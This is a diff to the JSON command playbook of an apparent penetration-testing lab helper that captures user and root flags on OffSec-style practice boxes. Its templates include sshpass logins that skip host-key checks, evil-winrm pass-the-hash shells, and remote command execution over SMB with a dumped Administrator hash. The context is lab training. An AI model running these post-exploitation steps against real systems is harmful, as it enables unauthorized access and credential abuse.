@@ -16,8 +16,7 @@
       "requires_any": [
         "foothold.linux",
         "access.shell",
-        "access.admin",
-        "access.system"
+        "access.admin"
       ],
       "os": [
         "linux"
@@ -34,19 +33,32 @@
       "commands": [
         {
           "tool": "sh",
-          "note": "IN YOUR SHELL (no credential needed): find every flag file and print the user flag with your identity for the screenshot. The common case — you do not need SSH creds to read a flag you can already reach.",
+          "locus": "onhost",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "IN YOUR SHELL (no credential needed): find every flag file and print the user flag with your identity for the screenshot. The common case - you do not need SSH creds to read a flag you can already reach.",
           "run": "id; hostname; ip -4 addr | grep inet; find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;"
         },
         {
           "tool": "sshpass",
+          "locus": "remote",
+          "settled_by": [
+            "objective.flag_located"
+          ],
           "note": "LOCATE OVER SSH (only if you hold SSH creds and have no shell yet). A one-liner from Kali, so it only LOCATES; OffSec scores a flag read this way ZERO. Paste the output back and obol records the path; capture it on the host next.",
           "run": "sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 {{user}}@{{target}} 'find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null'"
         },
         {
           "tool": "cat",
+          "locus": "onhost",
+          "win": true,
           "note": "ON THE HOST, capture the LOCAL/user flag with its identity. Run this INSIDE your shell and screenshot the whole frame: id + ip addr (the target IP) + the flag, together. obol records this as the captured local flag.",
           "run": "id; hostname; ip -4 addr | grep inet; cat {{flag_path_local}}"
         }
+      ],
+      "deprioritize_when": [
+        "objective.local_flag"
       ]
     },
     {
@@ -56,8 +68,7 @@
       "priority": 98,
       "requires_all": [],
       "requires_any": [
-        "access.admin",
-        "access.system"
+        "access.admin"
       ],
       "os": [
         "linux"
@@ -73,15 +84,24 @@
       },
       "commands": [
         {
-          "tool": "cat",
-          "note": "ON THE HOST as root, capture the ROOT flag with its identity. Run this INSIDE your root shell and screenshot the whole frame together (id must show uid=0). obol records this as the captured root flag — the box's final objective.",
-          "run": "id; hostname; ip -4 addr | grep inet; cat {{flag_path_root}}"
+          "tool": "find",
+          "locus": "onhost",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "IN YOUR ROOT SHELL: locate the root/proof flag and print it alongside your root identity and IP address for the report screenshot.",
+          "run": "id; hostname; ip -4 addr | grep inet; find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;"
         },
         {
           "tool": "cat",
-          "note": "If the exact path was not located yet, sweep for it as root (now that /root is readable).",
-          "run": "find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;"
+          "locus": "onhost",
+          "win": true,
+          "note": "ON THE HOST as root, capture the ROOT flag with its identity. Run this INSIDE your root shell and screenshot the whole frame together (id must show uid=0). obol records this as the captured root flag - the box's final objective.",
+          "run": "id; hostname; ip -4 addr | grep inet; cat {{flag_path_root}}"
         }
+      ],
+      "deprioritize_when": [
+        "objective.root_flag"
       ]
     },
     {
@@ -117,6 +137,10 @@
           "tool": "evil-winrm",
           "locus": "onhost",
           "requires_port": 5985,
+          "settled_by": [
+            "access.desktop",
+            "access.shell"
+          ],
           "run": "evil-winrm -i {{target}} -u '{{user}}' -p '{{password}}'",
           "note": "WINRM INTERACTIVE SHELL (Recommended when port 5985 is open): Connect directly over WinRM with domain credentials. Once connected, locate and capture the user flag."
         },
@@ -124,6 +148,10 @@
           "tool": "evil-winrm",
           "locus": "onhost",
           "requires_port": 5985,
+          "settled_by": [
+            "access.desktop",
+            "access.shell"
+          ],
           "run": "evil-winrm -i {{target}} -u '{{user}}' -H '{{nthash}}'",
           "note": "WINRM PASS-THE-HASH SHELL: Connect directly over WinRM with a captured NT hash."
         },
@@ -201,6 +229,9 @@
           "note": "LAB QUICK GRAB (not OffSec-legal): with the dumped Administrator hash, search every user's Desktop and print the flag remotely in one shot, no shell. obol fills the hash from the NTDS dump, no credential swap, and the names from your profile.",
           "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*user*.txt\" 2>nul'"
         }
+      ],
+      "deprioritize_when": [
+        "objective.local_flag"
       ]
     },
     {
@@ -358,6 +389,9 @@
           "run": "Get-Content 'C:\\Users\\Administrator\\Desktop\\{{filename}}' -Stream '{{stream_name}}'",
           "note": "POWERSHELL ADS READ: Reads the contents of a hidden alternate data stream flag (e.g. -Stream root.txt)."
         }
+      ],
+      "deprioritize_when": [
+        "objective.root_flag"
       ]
     }
   ]
